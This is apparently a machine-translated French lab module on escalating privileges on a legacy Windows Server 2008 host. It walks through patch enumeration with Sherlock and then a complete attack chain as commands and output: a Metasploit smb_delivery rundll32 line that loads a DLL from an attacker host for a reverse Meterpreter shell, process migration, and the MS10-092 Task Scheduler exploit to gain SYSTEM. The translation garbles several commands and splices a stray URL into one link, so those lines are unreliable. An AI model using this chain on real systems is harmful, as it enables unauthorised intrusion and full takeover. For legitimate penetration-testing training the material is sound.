Serveur Windows
==============

* * * * *

Windows Server 2008/2008 R2 est arrivé en fin de vie le 14 janvier 2020. Au fil des ans, Microsoft a ajouté des fonctionnalités de sécurité améliorées aux versions ultérieures de Windows Server. Il n'est pas très courant de rencontrer Server 2008 lors d'un test d'intrusion externe, mais je le rencontre souvent lors d'évaluations internes.

* * * * *

Server 2008 par rapport aux versions plus récentes
------------------------------

Le tableau ci-dessous montre quelques différences notables entre Server 2008 et les dernières versions de Windows Server.

| Caractéristique | Serveur 2008 R2 | Serveur 2012 R2 | Serveur 2016 | Serveur 2019 |
| --- | --- | --- | --- | --- |
| [Protection avancée contre les menaces Windows Defender (ATP) améliorée](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection) | | | | X |
| [Just Assez d'administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1) | Partielle | Partielle | X | X |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard) | | | X | X |
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard) | | | X | X |
| [Device Guard (intégrité du code)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419) | | | X | X |
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) | Partielle | X | X | X |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security) | Partielle | Partielle | X | X |
| [Control Flow Guard] (https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) | | | X | X |

* * * * *

Étude de cas du serveur 2008
----------------------

Souvent, lors de mes évaluations, je tombe sur des versions de système d'exploitation héritées, à la fois Windows et Linux. Parfois, il s'agit simplement de systèmes oubliés sur lesquels le client peut rapidement agir et mettre hors service, tandis que d'autres fois, il peut s'agir de systèmes critiques qui ne peuvent pas être facilement supprimés ou remplacés. Les testeurs d'intrusion doivent comprendre le cœur de métier du client et tenir des discussions pendant l'évaluation, en particulier lorsqu'il s'agit de scanner/énumérer et d'attaquer des systèmes hérités, et pendant la phase de reporting. Tous les environnements ne sont pas identiques et nous devons tenir compte de nombreux facteurs lors de la rédaction de recommandations pour les conclusions et de l'attribution de cotes de risque. Par exemple, les environnements médicaux peuvent exécuter des logiciels critiques sur des systèmes Windows XP/7 ou Windows Server 2003/2008. Sans comprendre le raisonnement "pourquoi", il ne suffit pas de leur dire simplement de retirer les systèmes de l'environnement. S'ils utilisent un logiciel d'IRM coûteux que le fournisseur ne prend plus en charge, la transition vers de nouveaux systèmes pourrait coûter cher. Dans ce cas, nous devrions examiner d'autres contrôles d'atténuation mis en place par le client, tels que la segmentation du réseau, le support étendu personnalisé de Microsoft, etc.

Si nous évaluons un client avec les protections les plus récentes et les meilleures et trouvons un hôte Server 2008 qui a été manqué, cela peut être aussi simple que de recommander une mise à niveau ou une mise hors service. Cela pourrait également être le cas dans des environnements soumis à des exigences d'audit/réglementaires strictes où un système hérité pourrait leur valoir un « échec » ou une note faible à leur audit et même les retarder ou les forcer à perdre un financement gouvernemental.

Examinons un hôte Windows Server 2008 que nous pouvons découvrir dans un environnement médical, une grande université ou un bureau gouvernemental local, entre autres.

Pour un système d'exploitation plus ancien comme Windows Server 2008, nous pouvons utiliser un script d'énumération comme [Sherlock](https://github.com/rasta-mouse/Sherlock) pour rechercher les correctifs manquants. Nous pouvons également utiliser quelque chose comme [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), qui prend les résultats de la commande `systeminfo` comme entrée et compare le niveau de correctif de l'hôte par rapport à la base de données des vulnérabilités de Microsoft pour détecter d'éventuels correctifs manquants sur la cible. Si un exploit existe dans le framework Metasploit pour le patch manquant donné, l'outil le suggérera. D'autres scripts d'énumération peuvent nous y aider, ou nous pouvons même énumérer manuellement le niveau de correctif et effectuer nos propres recherches. Cela peut être nécessaire s'il existe des limitations dans le chargement des outils sur l'hôte cible ou dans l'enregistrement de la sortie de la commande.

#### Interroger le niveau de correctif actuel

Utilisons d'abord WMI pour vérifier les KB manquants.

Interroger le niveau de correctif actuel

```
C:\htb> wmic qfe

Légende CSName Description FixComments HotFixID InstallDate InstalledBy InstalledOn Nom ServicePackInEffect État
http://support.microsoft.com/?kbid=2533552 Mise à jour WINLPE-2K8 KB2533552 WINLPE-2K8\Administrateur 31/03/2021

```

Un Google rapidela recherche du dernier correctif installé nous montre que ce système est très obsolète.

#### Exécuter Sherlock

Lançons Sherlock pour recueillir plus d'informations.

Exécuter Sherlock

```
PS C:\htb> Contournement Set-ExecutionPolicy -Processus d'étendue

Modification de la politique d'exécution
La politique d'exécution vous protège des scripts auxquels vous ne faites pas confiance. La modification de la stratégie d'exécution peut exposer
vous aux risques de sécurité décrits dans la rubrique d'aide about_Execution_Policies. Voulez-vous modifier l'exécution
politique?
[O] Oui [N] Non [S] Suspendre [?] Aide (la valeur par défaut est "O") : O

PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns

Titre : Mode Utilisateur à Sonnerie (KiTrap0D)
Bulletin MS : MS10-015
CVEID : 2010-0232
Lien : https://www.exploit-db.com/exploits/11199/
VulnStatus : non pris en charge sur les systèmes 64 bits

Titre : Planificateur de tâches .XML
Bulletin MS : MS10-092
CVEID : 2010-3338, 2010-3888
Lien : https://www.exploit-db.com/exploits/19930/
VulnStatus : Apparaît vulnérable

Titre : NTUserMessageCall Win32k Kernel Pool Overflow
Bulletin MS : MS13-053
CVEID : 2013-1300
Lien : https://www.exploit-db.com/exploits/33213/
VulnStatus : non pris en charge sur les systèmes 64 bits

Titre : TrackPopupMenuEx Win32k NULL Page
Bulletin MS : MS13-081
CVEID : 2013-3881
Lien : https://www.exploit-db.com/exploits/31576/
VulnStatus : non pris en charge sur les systèmes 64 bits

Titre : TrackPopupMenu Win32k Null Pointer Dereference
Bulletin MS : MS14-058
CVEID : 2014-4113
Lien : https://www.exploit-db.com/exploits/35101/
VulnStatus : Non Vulnérable

Titre : ClientCopyImage Win32k
Bulletin MS : MS15-051
CVEID : 2015-1701, 2015-2433
Lien : https://www.exploit-db.com/exploits/37367/
VulnStatus : Apparaît vulnérable

Titre : débordement du tampon du pilote de polices
Bulletin MS : MS15-078
CVEID : 2015-2426, 2015-2433
Lien : https://www.exploit-db.com/exploits/38222/
VulnStatus : Non Vulnérable

Titre : 'mrxdav.sys' WebDAV
Bulletin MS : MS16-016
CVEID : 2016-0051
Lien : https://www.exploit-db.com/exploits/40085/
VulnStatus : non pris en charge sur les systèmes 64 bits

Titre : Identifiant de connexion secondaire
Bulletin MS : MS16-032
CVEID : 2016-0099
Lien : https://www.exploit-db.com/exploits/39719/
VulnStatus : Apparaît vulnérable

Titre : Pilotes en mode noyau Windows EoP
Bulletin MS : MS16-034
CVEID : 2016-0093/94/95/96
Lien : https://github.com/SecWiki/windows-kernel-exploits/thttps://us-cert.cisa.gov/ncas/alerts/aa20-133aree/master/MS16-034?
VulnStatus : Non Vulnérable

Titre : Élévation de privilège Win32k
MSBulletin : MS16-135
CVEID : 2016-7255
Lien : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Non Vulnérable

Titre : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID : 2017-7199
Lien : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Non Vulnérable

```

#### Obtention d'un shell Meterpreter

À partir de la sortie, nous pouvons voir plusieurs correctifs manquants. À partir de là, récupérons un shell Metasploit sur le système et essayons d'élever les privilèges à l'aide de l'un des CVE identifiés. Tout d'abord, nous devons obtenir un shell inversé `Meterpreter` . Nous pouvons procéder de plusieurs manières, mais une méthode simple consiste à utiliser le module `smb_delivery` .

Obtention d'un shell Meterpreter

```
exploit msf6 (windows/smb/smb_delivery)> rechercher smb_delivery

Modules correspondants
================
    # Nom Divulgation Date Rang Vérification Description
    - ---- --------------- ---- ----- -----------
    0 exploit/windows/smb/smb_delivery 2016-07-26 excellent Pas de livraison SMB
Interagir avec un module par nom ou index. Par exemple info 0, utilisez 0 ou utilisez exploit/windows/smb/smb_delivery

exploit msf6 (windows/smb/smb_delivery)> utiliser 0

[*] Utilisation de fenêtres de charge utile configurées/meterpreter/reverse_tcp

exploit msf6 (windows/smb/smb_delivery) > afficher les options

Options du module (exploit/windows/smb/smb_delivery) :
    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    FILE_NAME test.dll pas de nom de fichier DLL
    FOLDER_NAME aucun nom de dossier à partager (aucun par défaut)
    PARTAGER pas de partage (par défaut aléatoire)
    SRVHOST 10.10.14.3 oui L'hôte local ou l'interface réseau sur laquelle écouter. Il doit s'agir d'une adresse sur la machine locale ou 0.0.0.0 pour écouter sur toutes les adresses.
    SRVPORT 445 oui Le port local sur lequel écouter.
Options de charge utile (windows/meterpreter/reverse_tcp) :
    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    EXITFUNC process oui Technique de sortie (Accepté : '', seh, thread, process, none)
    LHOST 10.10.14.3 oui L'adresse d'écoute (une interface peut être spécifiée)
    LPORT 4444 oui The port d'écoute
Cible d'exploitation :
    Nom d'identification
    -- ----
    1 HSP

exploit msf6 (windows/smb/smb_delivery)> afficher les cibles

Cibles d'exploitation :

    Nom d'identification
    -- ----
    0 DLL
    1 HSP

exploit msf6 (windows/smb/smb_delivery)> définir la cible 0

cible => 0

exploit msf6 (windows/smb/smb_delivery) > exploit
[*] Exploit exécuté en arrière-plan 1.
[*] Exploit terminé, mais aucune session n'a été créée.
[*] Démarrage du gestionnaire TCP inversé le 10.10.14.3:4444
[*] Auditeur de service démarré le 10.10.14.3:445
[*] Le serveur a démarré.
[*] Exécutez la commande suivante sur la machine cible :
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

```

#### Commande Rundll sur l'hôte cible

Ouvrez une console cmd sur l'hôte cible et collez la commande `rundll32.exe` .

Commande Rundll sur l'hôte cible

```
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0

```

#### Réception d'une coque inversée

Nous recevons un rappel rapidement.

Réception d'une coque inversée

```
msf6 exploit(windows/smb/smb_delivery) > [*] Étape d'envoi (175174 octets) à 10.129.43.15
[*] Session Meterpreter 1 ouverte (10.10.14.3:4444 -> 10.129.43.15:49609) au 2021-05-12 15:55:05 -0400

```

#### Recherche d'un exploit d'escalade de privilèges local

À partir de là, recherchons le module [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) .

Recherche d'un exploit d'escalade de privilèges local

```
exploit msf6 (windows/smb/smb_delivery)> recherche 2010-3338

Modules correspondants
================
    # Nom Divulgation Date Rang Vérification Description
    - ---- --------------- ---- ----- -----------
    0 exploit/windows/local/ms10_092_schelevator 2010-09-13 excellent Oui Windows Escalate Task Scheduler XML Privilege Escalation

exploit msf6 (windows/smb/smb_delivery) utiliser 0

```

#### Migration vers un processus 64 bits

Avant d'utiliser le module en question, nous devons sauter dans notre shell Meterpreter et migrer vers un processus 64 bits, sinon l'exploit ne fonctionnera pas. Nous aurions également pu choisir une charge utile x64 Meterpeter lors de l'étape `smb_delivery` .

Migration vers un processus 64 bits

```
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Début de l'interaction avec 1...

meterpreter > getpid

PID actuel : 2268

meterpreter > ps

Liste des processus
============
  PID PPID Nom Arch Session Utilisateur Chemin
  --- ---- ---- ---- ------- ---- ----
  0 0 [Processus système]
  4 0 Système
  164 1800 VMwareUser.exe x86 2 WINLPE-2K8\htb-student C:\Program Files (x86)\VMware\VMware Tools\VMwareUser.exe
  244 2032 winlogon.exe
  260 4 smss.exe
  288 476 svchost.exe
  332 324 csrss.exe
  376 324 wininit.exe
  476 376 services.exe
  492 376 lsass.exe
  500 376 lsm.exe
  584 476 mscorsvw.exe
  600 476 svchost.exe
  616 476 msdtc.exe
  676 476 svchost.exe
  744 476 taskhost.exe x64 2 WINLPE-2K8\htb-student C:\Windows\System32\taskhost.exe
  756 1800 VMwareTray.exe x86 2 WINLPE-2K8\htb-student C:\Program Files (x86)\VMware\VMware Tools\VMwareTray.exe
  764 476 svchost.exe
  800 476 svchost.exe
  844 476 svchost.exe
  900 476 svchost.exe
  940 476 svchost.exe
  976 476 spoolsv.exe
  1012 476 sppsvc.exe
  1048 476 svchost.exe
  1112 476 VMwareService.exe
  1260 2460 powershell.exe x64 2 WINLPE-2K8\htb-student C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  1408 2632 conhost.exe x64 2 WINLPE-2K8\htb-student C:\Windows\System32\conhost.exe
  1464 900 dwm.exe x64 2 WINLPE-2K8\htb-student C:\Windows\System32\dwm.exe
  1632 476 svchost.exe
  1672 600 WmiPrvSE.exe
  2140 2460 cmd.exe x64 2 WINLPE-2K8\htb-student C:\Windows\System32\cmd.exe
  2256 600 WmiPrvSE.exe
  2264 476 mscorsvw.exe
  2268 2628 rundll32.exe x86 2 WINLPE-2K8\htb-student C:\Windows\SysWOW64\rundll32.exe
  2460 2656 explorer.exe x64 2 WINLPE-2K8\htb-student C:\Windows\explorer.exe
  2632 2032 csrss.exe
  2796 2632 conhost.exe x64 2 WINLPE-2K8\htb-student C:\Windows\System32\conhost.exe
  2876 476 svchost.exe
  3048 476 svchost.exe

meterpreter > migrer 2796

[*] Migration de 2268 à 2796...
[*] Migration terminée avec succès.

mètrepreteur> arrière-plan

[*] Séance d'information 1...

```

#### Configuration des options du module d'escalade des privilèges

Une fois cela défini, nous pouvons maintenant configurer le module d'escalade de privilèges en spécifiant notre session Meterpreter actuelle, en définissant notre IP tun0 pour le LHOST et un port de rappel de notre choix.

Définition des options du module d'élévation des privilèges

```
exploit msf6 (windows/local/ms10_092_schelevator)> définir SESSION 1

SÉANCE => 1

exploit msf6 (windows/local/ms10_092_schelevator)> définir lhost 10.10.14.3

lhost => 10.10.14.3

exploit msf6 (windows/local/ms10_092_scheascenseur)> définir lport 4443

lport => 4443

exploit msf6 (windows/local/ms10_092_schelevator)> afficher les options

Options du module (exploit/windows/local/ms10_092_schelevator) :
    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    CMD pas de commande à exécuter au lieu d'une charge utile
    SESSION 1 oui La session sur laquelle exécuter ce module.
    TASKNAME non Un nom pour la tâche créée (aléatoire par défaut)
Options de charge utile (windows/meterpreter/reverse_tcp) :
    Nom Paramètre actuel requis Description
    ---- --------------- -------- -----------
    EXITFUNC process oui Technique de sortie (Accepté : '', seh, thread, process, none)
    LHOST 10.10.14.3 oui L'adresse d'écoute (une interface peut être spécifiée)
    LPORT 4443 oui Le port d'écoute
Cible d'exploitation :
    Nom d'identification
    -- ----
    0 Windows Vista, 7 et 2008

```

#### Réception d'une coque inversée surélevée

Si tout se passe comme prévu, une fois que nous aurons tapé `exploit`, nous recevrons un nouveau shell Meterpreter en tant que compte `NT AUTHORITY\SYSTEM` et nous pourrons continuer à effectuer toute post-exploitation nécessaire.

Réception de la coque inversée surélevée

```
exploit msf6 (windows/local/ms10_092_schelevator) > exploit

[*] Démarrage du gestionnaire TCP inversé le 10.10.14.3:4443
[*] Préparation de la charge utile sur C:\Windows\TEMP\uQEcovJYYHhC.exe
[*] Création de la tâche : isqR4gw3RlxnplB
[*] RÉUSSITE : la tâche planifiée "isqR4gw3RlxnplB" a été créée avec succès.
[*] SCHELEVATEUR
[*] Lecture du contenu du fichier de tâche à partir de C:\Windows\system32\tasks\isqR4gw3RlxnplB...
[*] CRC32 d'origine : 0x89b06d1a
[*] CRC32 final : 0x89b06d1a
[*] Réécriture de notre contenu modifié...
[*] Tâche de validation : isqR4gw3RlxnplB
[*]
[*] Dossier:\
[*] Nom de la tâche État de la prochaine exécution
[*] ======================================= ======= =============== ===============
[*] isqR4gw3RlxnplB 01/06/2021 13:04:00 Prêt
[*] SCHELEVATEUR
[*] Désactivation de la tâche...
[*] SUCCÈS : Les paramètres de la tâche planifiée "isqR4gw3RlxnplB" ont été modifiés.
[*] SCHELEVATEUR
[*] Activation de la tâche...
[*] SUCCÈS : Les paramètres de la tâche planifiée "isqR4gw3RlxnplB" ont été modifiés.
[*] SCHELEVATEUR
[*] Exécution de la tâche...
[*] Étape d'envoi (175174 octets) vers 10.129.43.15
[*] RÉUSSITE : Tentative d'exécution de la tâche planifiée "isqR4gw3RlxnplB".
[*] SCHELEVATEUR
[*] Suppression de la tâche...
[*] Meterpreter session 2 ouverte (10.10.14.3:4443 -> 10.129.43.15:49634) au 2021-05-12 16:04:34 -0400
[*] RÉUSSITE : la tâche planifiée "isqR4gw3RlxnplB" a été supprimée avec succès.
[*] SCHELEVATEUR

meterpreter > getuid

Nom d'utilisateur du serveur : NT AUTHORITY\SYSTEM

meterpreter > sysinfo

Ordinateur : WINLPE-2K8
Système d'exploitation : Windows 2008 R2 (6.1 Build 7600).
Architecture : x64
Langue du système : en_US
Domaine : GROUPE DE TRAVAIL
Utilisateurs connectés : 3
Meterpreter : x86/windows

```

* * * * *

Serveur d'attaque 2008
---------------------

En prenant les exemples d'énumération que nous avons parcourus dans ce module, accédez au système ci-dessous, trouvez un moyen de passer au niveau d'accès `NT AUTHORITY\SYSTEM` (il peut y avoir plus d'un moyen) et soumettez le fichier `flag.txt`  sur le bureau de l'administrateur. Mettez-vous au défi d'élever les privilèges de plusieurs façons et ne reproduisez pas simplement l'escalade de privilèges du planificateur de tâches détaillée ci-dessus.